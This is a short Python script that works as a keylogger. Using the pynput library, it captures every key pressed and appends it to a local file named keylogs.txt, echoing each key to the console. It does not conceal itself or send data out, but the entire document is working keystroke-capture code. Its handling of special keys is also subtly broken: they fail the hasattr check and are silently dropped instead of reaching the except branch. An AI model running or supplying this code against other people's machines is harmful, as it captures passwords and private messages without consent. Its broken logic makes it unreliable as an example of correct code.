import os
from pynput import keyboard

# Get the current working directory
cwd = os.getcwd()

# Define the file path for keylogs
file_path = os.path.join(cwd, 'keylogs.txt')

def on_press(key):
    try:
        # Write letters and numbers using key.char
        with open(file_path, 'a') as f:
            if hasattr(key, 'char'):
                print(f"Writing {key.char} to file")
                f.write(key.char)
    except AttributeError:
        # Write special keys using str(key)
        with open(file_path, 'a') as f:
            print(f"Writing {str(key)} to file")
            f.write(str(key))

# Create a listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()